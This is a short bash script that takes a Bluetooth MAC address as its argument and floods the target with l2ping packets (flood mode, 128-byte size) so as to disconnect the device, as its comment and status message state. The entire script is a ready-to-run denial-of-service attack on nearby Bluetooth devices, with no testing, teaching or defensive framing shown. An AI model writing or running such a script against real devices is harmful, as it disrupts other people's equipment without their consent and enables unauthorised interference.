#!/bin/bash
# Disconnect a Bluetooth device using l2ping
if [ $# -ne 1 ]; then
  echo "Usage: $0 <TARGET_MAC>"
  exit 1
fi

TARGET_MAC=$1

echo "[*] Sending ping flood to $TARGET_MAC to disconnect it..."
sudo l2ping -i hci0 -s 128 -f $TARGET_MAC
